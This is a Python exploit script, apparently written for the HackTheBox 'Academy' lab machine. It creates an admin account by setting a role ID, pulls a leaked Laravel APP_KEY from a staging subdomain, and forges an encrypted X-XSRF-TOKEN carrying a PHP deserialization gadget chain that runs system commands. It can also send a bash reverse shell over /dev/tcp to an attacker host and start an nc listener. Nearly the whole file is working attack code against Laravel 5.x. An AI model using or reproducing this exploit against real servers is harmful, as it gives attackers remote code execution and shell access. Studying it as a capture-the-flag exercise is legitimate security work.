#!/usr/bin/env python3
from Crypto.Cipher import AES
from hashlib import sha256
from Crypto.Util.Padding import pad
import hmac, json, base64, os, time, sys, rich, requests, re, argparse, pdb, socket, threading, subprocess, signal


# Argument parser
parser = argparse.ArgumentParser()
parser.add_argument("-rhost", "--rhost", help="Remote host", required=True)
parser.add_argument("-lhost", "--lhost", help="Local host", required=True)
parser.add_argument("-lport", "--lport", help="Local port", required=True)
parser.add_argument("-r", "--rev", help="Reverse Shell", action="store_true")
parser.add_argument("-c", "--command", help="command", required=False)

args = parser.parse_args()
lhost = args.lhost
rhost = args.rhost
lport = args.lport
com = args.command

main_url = "http://academy.htb/"

# Check if the script is run as root:
if not os.geteuid() == 0:
    rich.print("[yellow][+] Consider running this script as root! [/yellow]")
    sys.exit(1)

def checkHosts():
    # Check if academy.htb is added to /etc/hosts1
    with open('/etc/hosts', 'r') as file:
        data = file.read().replace('\n', '')
        if "academy.htb" not in data:
            rich.print("[red][!] academy.htb is not added to /etc/hosts [/red]")
            time.sleep(1)
            rich.print("[yellow][!] Adding it to /etc/hosts [/yellow]")
            time.sleep(1)
            os.system(f"echo '{rhost} academy.htb' >> /etc/hosts")

def MakeRequest():
    s = requests.Session()
    # Create an account
    data = {
        'uid': 'rootme',
        'password': 'rootme',
        'confirm': 'rootme',
        'roleid': '1'
    }

    ## Change this to your PHPSESSID value if you want. Not needed tho##
    cookies = {
        'PHPSESSID': 'qlk0p3q8nbigpddhnr24r5l58l'
    }

    register_url = main_url + "register.php"
    try:
        r = s.post(register_url, data=data, cookies=cookies)
        if r.status_code == 200:
            rich.print("[green][+] Account created successfully. [/green]")
            rich.print("[yellow][+] Credentials -> rootme:rootme [/yellow]")
    except:
        rich.print("[red][!] Account created [/red]")

    # Add new host to /etc/hosts if not added yet
    with open('/etc/hosts', 'r') as check:
        if "dev-staging-01.academy.htb" not in check.read():
            rich.print("[yellow][+] New host discovered: dev-staging-01.academy.htb -> Adding it to /etc/hosts [/yellow]")
            with open('/etc/hosts', 'r') as file:
                data = file.read().replace('\n', '')
                if "dev-staging-01.academy.htb" not in data:
                    time.sleep(1)
                    os.system(f"echo '{rhost} dev-staging-01.academy.htb' >> /etc/hosts")

def exploit_thread():
    def Exploit():
        # Extract API_KEY
        s = requests.get("http://dev-staging-01.academy.htb/")
        source_code = s.text
        pattern = r'base64:([\w/+]+=*)'
        api_key = re.search(pattern, source_code)[1]

        rich.print("[blue][+] Laravel 5.X version detected. [/blue]")
        rich.print("[yellow][+] Exploiting it... [/yellow]")

        key = api_key
        if args.rev:
            comand = f"bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'"
        else:
            comand = com

        payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(comand)) + ':"' + comand + '";}'

        # Base64 encoded
        base64_payload = base64.b64encode(payload.encode()).decode('utf-8')

        # Base64 decoded key
        base64_decoded_key = base64.b64decode(key)

        # AES Encrypt the payload:
        cipher = AES.new(base64_decoded_key, AES.MODE_CBC)
        value = cipher.encrypt(pad(base64.b64decode(base64_payload), AES.block_size))
        payload_def = base64.b64encode(value)

        # IV base64 encoded
        iv_base64 = base64.b64encode(cipher.iv)

        # Hashing mac
        hashed_mac = hmac.new(base64_decoded_key, iv_base64 + payload_def, sha256).hexdigest()

        # Decoded from base64
        iv_decoded_base64 = iv_base64.decode('utf-8')
        payload_decoded_base64 = payload_def.decode('utf-8')

        # Data that will be sent through the request
        data = {
            'iv': iv_decoded_base64,
            'value': payload_decoded_base64,
            'mac': hashed_mac
        }

        # Json form data
        json_data = json.dumps(data)

        # Final payload encoded
        final_payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')

        headers = {
            'X-XSRF-TOKEN': final_payload_encoded
        }

        # Proxy in case you want to add id to the request and analyze it through burp
        proxy = {
            'http': 'http://localhost:8080',
            'https': 'https://localhost:8080'
        }

        url = "http://dev-staging-01.academy.htb/"
        try:
            r = requests.post(url=url, headers=headers)
            rich.print(r.text.split('<!DOCTYPE html>')[0])
        except:
            rich.print("[red][!] Exploit failed [/red]")

    t1 = threading.Thread(target=Exploit)
    t1.start()
    t1.join()

def shell():
    def spawnShell():
        if args.rev:
            subprocess.Popen(["rlwrap", "nc", "-lvnp", "4444"])
    t2 = threading.Thread(target=spawnShell)
    t2.start()
    t2.join()

if __name__ == "__main__":
    checkHosts()
    shell()
    MakeRequest()
    lport = 4444
    exploit_thread()





